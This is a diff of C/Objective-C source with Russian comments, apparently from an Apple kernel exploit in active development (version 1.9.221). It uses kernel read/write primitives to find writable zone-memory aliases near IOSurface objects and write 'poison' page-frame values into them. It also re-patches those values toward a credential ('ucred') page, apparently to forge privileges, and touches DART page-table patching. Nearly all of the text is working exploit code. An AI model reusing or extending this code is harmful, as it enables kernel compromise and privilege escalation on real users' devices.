@@ -6311,18 +6311,48 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
         kpNote(r, [NSString stringWithFormat:@"  [DEP] хранилищ pfn: %d — патчим на ctlPFN %#x (PA %#llx)", nDep, ctlPFN, (unsigned long long)ctlPA]);
+        // 1.9.221: запись яда ТОЛЬКО через zone-VA — physmap-хит страница может
+        // быть physmap-RO (паника на записи, 1.9.220 форма1 @ physmap). Ищем
+        // zone-VA той же страницы контент-поиском по значению хита (уникально)
+        // в окне вокруг IOSurface-объектов (аренные структуры кластерятся).
+        uint64_t pdZ = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t roZ = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+        uint64_t anch[3] = { surfVA, pdZ, roZ };
+        uint64_t mnZ = ~0ULL, mxZ = 0;
+        for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
         for (int i = 0; i < nDep; i++) {
             uint64_t nq = hitOld[i];
             if (hitForm[i] == 1) nq = (hitOld[i] & 0x3fffULL) | ctlPA;
             else if (hitForm[i] == 3) nq = ((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL);
-            else if (hitForm[i] == 4) nq = (hitOld[i] & 0xffffffff00000000ULL) | ctlPFN;
             else if (hitForm[i] == 2) nq = (uint64_t)ctlPFN;
-            kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d @ %#llx: %#018llx → %#018llx",
-                      i, hitForm[i], (unsigned long long)hitAddr[i], (unsigned long long)hitOld[i], (unsigned long long)nq]);
+            // zone-scan значения хита
+            uint64_t zva = 0;
+            if (mnZ != ~0ULL) {
+                uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
+                for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
+                    if (!kpSafeToRead(pg)) continue;
+                    uint8_t zbuf[0x4000];
+                    kreadbuf(pg, zbuf, sizeof(zbuf));
+                    for (uint32_t o = 0; o + 8 <= sizeof(zbuf) && !zva; o += 8) {
+                        uint64_t q = 0; memcpy(&q, zbuf + o, 8);
+                        if (q != hitOld[i]) continue;
+                        if (pg + o == hitAddr[i]) continue;   // physmap-алиас сам себя
+                        zva = pg + o;
+                    }
+                }
+            }
+            if (!zva) {
+                kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d @ physmap %#llx — zone-VA НЕ найден, хит пропущен (устройство живо, яд не вписан)", i, hitForm[i], (unsigned long long)hitAddr[i]]);
+                hitForm[i] = -1;   // retry/forge/final-restore пропустят
+                continue;
+            }
+            kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d zone-VA %#llx: %#018llx → %#018llx",
+                      i, hitForm[i], (unsigned long long)zva, (unsigned long long)hitOld[i], (unsigned long long)nq]);
             usleep(2000);
-            early_kwrite64(hitAddr[i], nq);
-            uint64_t rb2 = early_kread64(hitAddr[i]);
+            early_kwrite64(zva, nq);
+            uint64_t rb2 = early_kread64(zva);
             kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb2, rb2 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+            hitAddr[i] = zva;   // все последующие записи (retry/forge/restore) — через zone-VA
         }
     }
     // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
@@ -7034,7 +7064,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     for (int attempt = 1; !changed && attempt < 4; attempt++) {
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
         for (int i = 0; i < nDep; i++) {
-            if (hitForm[i] == 4) continue;
+            if (hitForm[i] < 0 || hitForm[i] == 4) continue;
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
                         : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
                         : (uint64_t)ctlPFN;
@@ -7051,14 +7081,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   attempt, rkr, changed, (unsigned long long)cur0]);
         if (!changed) {
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
-            for (int i = 0; i < nDep; i++) if (hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+            for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
         }
     }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
     for (int j = 0; j < nSlots; j++)
         early_kwrite64(slotVAs[j], origQs[j]);
     // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
-    for (int i = 0; i < nDep; i++) if (hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+    for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // 1.9.198: restore VA-поля буфера (teardown-safety)
     if (vaFldObj) {
         early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
@@ -7142,6 +7172,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     // DEP-хиты — перепатч на ucredPFN (покрываем оба пути prepare)
                     for (int i = 0; i < nDep; i++) {
+                        if (hitForm[i] < 0) continue;   // 1.9.221: пропущенные (zone-VA не нашлись) — не трогаем, там physmap-RO
                         uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | pagePA)
                                     : (hitForm[i] == 3) ? (((uint64_t)fPFN << 32) | (hitOld[i] & 0xffffffffULL))
                                     : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
@@ -7179,7 +7210,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, @"=== контрольная не изменилась — см. выше ===");
     }
     // 1.9.219: restore DEP-хитов после форжа (яд формы ucredPFN не живёт дальше)
-    if (changed) for (int i = 0; i < nDep; i++) if (hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+    if (changed) for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // === 1.9.160 фаза 2: DART PTE patch с живым mapping (раунд 36) ===
     // IOBufferMD вычисляет PA при prepare из kernel VA (+0xb8) — производные поля
     // откатываются per-map (факт железа 1.9.158: откат +0x98). Поэтому: mapping
